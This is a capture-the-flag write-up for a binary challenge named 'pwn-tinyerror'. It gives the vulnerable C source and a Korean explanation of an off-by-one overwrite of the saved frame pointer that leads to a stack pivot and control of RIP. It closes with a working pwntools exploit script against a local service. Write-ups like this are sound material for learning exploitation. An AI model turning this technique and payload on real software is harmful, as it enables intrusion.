# pwn-tinyerror

# Usage
- 2024.09#0

# Concept
- Off-by-one
- SFP Overwrite

# Writeup

```c
int main()
{
    char buf[100];
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);

    puts("Provide your input: ");
    read(0, input, 200);
    
    int dec = interpret_dec();
    printf("Interpreted as decimal: %d\n", dec);

    int hex = interpret_hex();
    printf("Interpreted as hex: %d\n", hex);
}
```
전역변수에 input을 입력받고 이를 `interpret_dec`, `interpret_hex` 함수에서 사용합니다.

```c
int interpret_dec()
{
    char buf[100];
    if(strlen(input) > 112){
        puts("Input too long!");
        exit(-1);
    }
    memcpy(buf, input, 113);
    return atoi(buf);
}

int interpret_hex()
{
    char buf[100];
    if(strlen(input) > 112){
        puts("Input too long!");
        exit(-1);
    }
    memcpy(buf, input, 113);
    return strtol(buf, NULL, 16);
}

```
로컬변수 버퍼의 크기는 100이지만, 실제로 버퍼에서 SFP까지의 offset은 112, 리턴 주소까지의 offset은 120으로 설정됩니다.(allignment) 113만큼 memcpy를 하는데, 이때 SFP의 1바이트가 덮이는 off-by-one이 발생합니다. 길이 체크는 strlen으로 하기 때문에 null이 포함된 페이로드는 종료되지 않습니다.

이 과정이 2번 발생하기 때문에 자동으로 스택이 pivoting되어 `interpret_hex`의 return에서 RIP를 바꿀 수 있습니다.


#### ex.py
```python
#!/usr/bin/env python3
import sys, os
from pwn import *

TARGET= "./chall"
elf = ELF(TARGET)
HOST, PORT = 'localhost 11115'.split(' ')


def exploit(p):
    p.recvuntil(b"input")
    p.send(b"12\t"+b"A"*101 + p64(0x401256))
    p.interactive()
    return

if __name__ == "__main__":
    p = remote(HOST, PORT)
    exploit(p)
    exit(0)```
```